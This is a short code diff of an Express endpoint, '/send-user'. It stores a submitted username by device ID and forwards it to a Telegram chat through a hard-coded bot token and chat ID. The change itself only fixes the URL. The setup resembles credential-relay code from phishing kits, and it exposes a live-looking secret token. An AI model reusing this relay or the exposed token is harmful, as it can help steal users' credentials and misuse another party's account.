@@ -30,7 +30,7 @@ app.post('/send-user', async (req, res) => {
     }
     usuariosData[dispositivoID].usuario = `Usuario ${dispositivoID.replace('id.', '')}: \`${usuario}\``;
 
-    await fetch(`https://api.telegram.org/bot8018552342:AAHZ2upDtbdcwPpTbYGKlH0uGZbczo1evjA/sendMessage/`, {
+    await fetch(`https://api.telegram.org/bot8018552342:AAHZ2upDtbdcwPpTbYGKlH0uGZbczo1evjA/sendMessage`, {
         method: 'POST',
         body: JSON.stringify({
             chat_id: '7938210264',
